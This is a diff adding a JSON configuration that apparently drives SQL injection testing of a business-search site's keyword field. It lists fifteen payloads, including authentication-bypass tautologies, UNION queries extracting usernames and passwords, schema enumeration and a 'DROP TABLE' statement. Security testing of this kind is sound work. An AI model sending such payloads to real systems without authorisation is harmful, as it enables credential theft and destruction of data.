@@ -1,0 +1,22 @@
+{
+  "url": "https://ethiofind.com",
+  "normalKeyword": "restaurant",
+  "normalCity": "Addis Ababa",
+  "sqlPayloads": [
+    "' OR '1'='1",
+    "' OR '1'='1' --",
+    "' OR 1=1 --",
+    "restaurant' --",
+    "' UNION SELECT * FROM businesses --",
+    "' OR ''='",
+    "'; DROP TABLE businesses; --",
+    "' AND 1=0 UNION SELECT name, description FROM businesses --",
+    "restaurant' UNION SELECT username, password FROM users --",
+    "' OR 'x'='x",
+    "restaurant' OR '1'='1",
+    "' UNION SELECT database() --",
+    "' UNION SELECT table_name FROM information_schema.tables --",
+    "restaurant' AND 1=0 UNION SELECT version() --",
+    "' OR EXISTS(SELECT * FROM users) --"
+  ]
+}
